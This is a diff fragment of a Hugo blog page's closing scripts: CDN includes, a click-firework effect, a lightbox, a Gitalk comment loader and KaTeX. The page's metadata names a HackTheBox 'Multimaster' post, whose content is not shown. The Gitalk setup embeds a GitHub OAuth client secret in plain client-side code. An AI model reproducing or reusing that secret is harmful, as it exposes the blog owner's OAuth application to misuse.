+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Multimaster",
+          url: "http:\/\/localhost:1313\/post\/htb-multimaster\/",
+          description: "HackTheBox篇Active Directory 101系列之Multimaster",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
